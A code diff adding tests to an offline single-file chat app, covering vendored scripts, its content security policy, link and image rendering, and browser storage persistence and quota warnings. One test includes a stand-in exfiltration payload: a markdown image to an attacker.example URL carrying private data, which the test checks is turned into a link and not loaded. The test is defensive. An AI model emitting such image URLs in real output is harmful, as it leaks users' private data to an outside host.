@@ -384,3 +384,146 @@ test('capped utility calls skip model thinking, fall back on older servers, and 
   await build();
   assert.equal(bodies.length, 1, 'no second attempt on the very next send');
 });
+
+// ---- Offline single file, integrity and storage durability (2.4.0) ----
+
+test('the embedded libraries match the pinned packages and no core script comes from a CDN', () => {
+  const vendor = require('../tools/vendor.cjs');
+  assert.equal(vendor.render(html), html, 'index.html vendored block is out of date. Run: node tools/vendor.cjs');
+  for (const name of ['jszip', 'marked', 'dompurify']) {
+    const version = require(`../node_modules/${name}/package.json`).version;
+    assert(html.includes(`<script data-vendor="${name}@${version}">`), name);
+  }
+  assert(html.includes('<script data-vendor="highlight.js@11.9.0">'));
+  assert.equal([...html.matchAll(/<script[^>]*\ssrc=/g)].length, 0, 'no external script tags remain');
+  assert(!/cdnjs\.cloudflare\.com/.test(html));
+  assert(!/<link[^>]+font-awesome/i.test(html));
+  const head = html.slice(html.indexOf(vendor.BEGIN), html.indexOf(vendor.END));
+  // An embedded script must never contain a sequence that ends or escapes its element.
+  for (const match of head.matchAll(/<script data-vendor="[^"]+">([\s\S]*?)<\/script>/g)) assert(!/<!--|<\/?script/i.test(match[1]));
+  assert.equal([...head.matchAll(/<script data-vendor=/g)].length, 4);
+  const pdf = vendor.pdfIntegrity();
+  for (const [file, hash] of Object.entries(pdf)) assert(html.includes(`"${file}": "${hash}"`), file);
+});
+
+test('every icon class used by the page has an embedded icon', () => {
+  const vendor = require('../tools/vendor.cjs');
+  const start = html.indexOf(vendor.BEGIN), end = html.indexOf(vendor.END);
+  const icons = vendor.usedIcons(html.slice(0, start) + html.slice(end));
+  assert(icons.length > 30);
+  for (const icon of icons) assert(html.includes(`.fa-${icon.style}.fa-${icon.name}{--fa-icon:url("data:image/svg+xml,`), `${icon.style} ${icon.name}`);
+});
+
+test('the content security policy blocks remote images, frames and unlisted script hosts', () => {
+  const policy = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/)[1];
+  const directives = Object.fromEntries(policy.split(';').map(part => part.trim().split(/\s+/)).map(([name, ...values]) => [name, values]));
+  assert.deepEqual(directives['default-src'], ["'none'"]);
+  assert.deepEqual(directives['img-src'], ["'self'", 'data:', 'blob:']);
+  assert.deepEqual(directives['script-src'].filter(value => value.startsWith('http')), ['https://cdn.jsdelivr.net']);
+  assert(!directives['script-src'].includes("'unsafe-eval'"));
+  for (const name of ['object-src', 'frame-src', 'base-uri', 'form-action']) assert.deepEqual(directives[name], ["'none'"], name);
+  assert(html.indexOf('Content-Security-Policy') < html.indexOf('<script'), 'the policy precedes every script');
+});
+
+test('rendered remote images become links and links open outside the app', async t => {
+  const app = createApp(); t.after(app.close); await app.boot();
+  const element = app.run('createMessageElement({id:9,role:"assistant",type:"text",text:"Look ![secret chart](https://attacker.example/x.png?d=PRIVATE) and [a link](https://example.com/page) and ![ok](data:image/png;base64,iVBORw0KGgo=)"})');
+  assert.equal(element.querySelectorAll('img[src^="http"]').length, 0);
+  assert.equal(element.querySelectorAll('img[src^="data:image/png"]').length, 1);
+  const replaced = element.querySelector('a.remote-image-link');
+  assert.equal(replaced.getAttribute('href'), 'https://attacker.example/x.png?d=PRIVATE');
+  assert.equal(replaced.textContent, '[image: secret chart]');
+  for (const link of element.querySelectorAll('a[href]')) {
+    assert.equal(link.getAttribute('target'), '_blank');
+    assert.equal(link.getAttribute('rel'), 'noopener noreferrer');
+  }
+});
+
+function withStorage(app, overrides = {}) {
+  const state = { persisted: false, grant: false, persistCalls: 0, usage: 5 * 1024 * 1024, quota: 1024 * 1024 * 1024, ...overrides };
+  Object.defineProperty(app.window.navigator, 'storage', { configurable: true, value: {
+    persisted: async () => state.persisted,
+    persist: async () => { state.persistCalls++; if (state.grant) state.persisted = true; return state.persisted; },
+    estimate: async () => ({ usage: state.usage, quota: state.quota })
+  } });
+  return state;
+}
+const settle = () => new Promise(resolve => setTimeout(resolve, 20));
+
+test('persistent storage is requested after the first write, once, and a refusal is not repeated', async t => {
+  const app = createApp(); t.after(app.close); await app.boot();
+  const state = withStorage(app);
+  await app.run('refreshStorageStatus()');
+  assert.equal(state.persistCalls, 0, 'nothing is requested before there is data');
+  await app.run('saveMessage({role:"user",text:"Hello",type:"text",timestamp:1},1)');
+  await settle();
+  assert.equal(state.persistCalls, 1);
+  await app.run('saveMessage({role:"assistant",text:"Hi",type:"text",timestamp:2},1)');
+  await settle();
+  assert.equal(state.persistCalls, 1, 'not asked again in the same session');
+  assert(Number(app.window.localStorage.getItem('storagePersistDeclinedAt')) > 0);
+  const status = normalize(await app.run('refreshStorageStatus()'));
+  assert.equal(status.messages, 2);
+  assert.equal(app.document.getElementById('storagePersistenceText').textContent.startsWith('Not protected'), true);
+  assert.equal(app.document.getElementById('storagePersistButton').style.display, '');
+  assert.equal(app.document.getElementById('storageUsageText').textContent, '5.0 MB of 1.0 GB available (0.5%)');
+  assert.equal(app.document.getElementById('storageContentsText').textContent, '1 thread · 2 messages · 0 documents · 0 memories');
+  assert.equal(app.document.getElementById('storageBackupText').textContent, 'Never');
+  const notice = app.document.getElementById('storageNotice');
+  assert.equal(notice.style.display, 'block');
+  assert(notice.textContent.includes('never backed up'));
+  // A new session inside the retry window stays quiet; the button and an install still work.
+  app.run('storagePersistAttempted = false');
+  await app.run('requestPersistentStorage()');
+  assert.equal(state.persistCalls, 1);
+  state.grant = true;
+  assert.equal(await app.run('requestPersistentStorage({ retry: true })'), true);
+  assert.equal(state.persistCalls, 2);
+  assert.equal(app.window.localStorage.getItem('storagePersistDeclinedAt'), null);
+  await app.run('refreshStorageStatus()');
+  assert(app.document.getElementById('storagePersistenceText').textContent.startsWith('Protected'));
+  assert.equal(app.document.getElementById('storagePersistButton').style.display, 'none');
+  assert.equal(notice.style.display, 'none');
+});
+
+test('storage warnings reflect fullness and the last backup time', async t => {
+  const app = createApp(); t.after(app.close); await app.boot();
+  const state = withStorage(app, { persisted: true, usage: 800, quota: 1000 });
+  let status = normalize(await app.run('refreshStorageStatus()'));
+  assert.equal(status.level, 'warning');
+  assert.equal(app.document.getElementById('storageNotice').textContent, 'Storage is 80% full.');
+  state.usage = 950;
+  status = normalize(await app.run('refreshStorageStatus()'));
+  assert.equal(status.level, 'danger');
+  assert(app.document.getElementById('storageNotice').textContent.includes('may not be saved'));
+  assert.equal(app.document.getElementById('storageMeter').getAttribute('aria-valuenow'), '95');
+  app.window.localStorage.setItem('lastWorkspaceBackupAt', String(Date.UTC(2026, 0, 2)));
+  await app.run('refreshStorageStatus()');
+  assert.notEqual(app.document.getElementById('storageBackupText').textContent, 'Never');
+  assert.equal(app.run('formatBytes(1536)'), '1.5 KB');
+  assert.equal(app.run('formatBytes(0)'), '0 B');
+});
+
+test('a browser without the storage API degrades to a plain statement', async t => {
+  const app = createApp(); t.after(app.close); await app.boot();
+  Object.defineProperty(app.window.navigator, 'storage', { configurable: true, value: undefined });
+  await app.run('saveMessage({role:"user",text:"Hello",type:"text",timestamp:1},1)');
+  const status = normalize(await app.run('refreshStorageStatus()'));
+  assert.equal(status.canPersist, false);
+  assert(app.document.getElementById('storagePersistenceText').textContent.includes('cannot protect storage'));
+  assert.equal(app.document.getElementById('storageUsageText').textContent, 'Not reported by this browser');
+  assert.equal(app.document.getElementById('storagePersistButton').style.display, 'none');
+});
+
+test('a failed write is reported instead of being silently dropped', async t => {
+  const app = createApp(); t.after(app.close); await app.boot();
+  const alerts = [];
+  app.window.alert = message => alerts.push(message);
+  app.run('alert = window.alert');
+  // A message that cannot be cloned makes the transaction fail, as a full disk would.
+  const id = await app.run('saveMessage({role:"user",text:"x",type:"text",timestamp:1,bad(){}},1).catch(()=>null)');
+  assert.equal(id ?? null, null);
+  app.run('reportStorageWriteError(Object.assign(new Error("full"),{name:"QuotaExceededError"}),"message")');
+  await settle();
+  assert(alerts.some(message => /storage is full/.test(message) || /could not be saved/.test(message)), JSON.stringify(alerts));
+});
